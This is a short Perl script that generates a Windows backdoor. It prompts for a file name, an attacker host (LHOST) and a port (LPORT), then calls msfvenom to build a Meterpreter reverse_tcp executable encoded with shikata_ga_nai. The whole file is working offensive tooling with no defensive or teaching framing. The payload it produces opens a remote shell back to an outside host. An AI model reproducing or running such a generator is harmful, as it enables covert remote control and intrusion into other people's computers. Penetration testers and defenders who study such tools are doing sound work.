#!/usr/bin/perl -w
require "info.pl";

#Display Info
&info();

#Program Start
START:
print "Enter a name for the Backdoor file you want to create : ";
chomp($backdoor = <STDIN>);

if(-e "$backdoor.exe")
{
	print "File Already Exists !\n";
	print "Do you want to delete the existing file ? [Y/n] : ";
	chomp($ans = <STDIN>);
	if($ans eq "Y")
	{
		unlink("$backdoor.exe");
		goto START;
	}
	
}
else
{
	START2:
	print "Enter LHOST : ";
	chomp($lhost = <STDIN>);
	print "Enter LPORT : ";
	chomp($lport = <STDIN>);
	

	$string = "msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe > $backdoor.exe LHOST=$lhost LPORT=$lport";
	
	sureDecision:
	print "Are you Sure about the details you Entered ? [Y/n] : ";
	chomp($ans = <STDIN>);
	if($ans eq "Y")
	{
		print "Genarating $backdoor.exe file !\n";
		system("$string");
	}
	elsif($ans eq "n")
	{
		print "Enter LHOST and LPORT again \n";
		goto START2;
	}
	else
	{
		print "You can only enter Y or n !";
		goto  sureDecision;
	}

}
